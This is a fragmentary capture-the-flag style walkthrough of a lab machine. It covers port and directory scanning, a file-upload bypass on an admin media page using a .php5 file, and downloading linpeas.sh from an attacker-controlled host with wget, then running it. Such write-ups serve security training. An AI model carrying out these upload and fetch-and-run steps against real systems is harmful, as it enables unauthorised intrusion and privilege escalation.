...
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-24 12:28 +08
...
[+] Timeout:                 10s
===============================================================
2022/04/24 12:32:19 Starting gobuster in directory enumeration mode
===============================================================
...
![admin_homepage](admin_homepage.png)

# Exploit

There’s a `/media` page that allows us to upload files.

![admin_mediapage](admin_mediapage.png)
...
![upload_php5_file](upload_php5_file.png)
...
--2022-04-24 07:54:25--  http://10.10.14.11/linpeas.sh
...
$ cd /tmp
$ wget http://10.10.14.11/linpeas.sh
--2022-04-24 07:54:52--  http://10.10.14.11/linpeas.sh
Connecting to 10.10.14.11:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 776167 (758K) [text/x-sh]
Saving to: 'linpeas.sh'
   ...
   700K .......... .......... .......... .......... .......... 98% 7.23M 0s
   750K .......                                               100% 13.6M=0.1s
2022-04-24 07:54:52 (6.14 MB/s) - 'linpeas.sh' saved [776167/776167]
$ chmod +x linpeas.sh
$ ./linpeas.sh 
...
                                         ╔═══════════════════╗
...
Receiving objects: 100% (382/382), 290.84 KiB | 12.12 MiB/s, done.
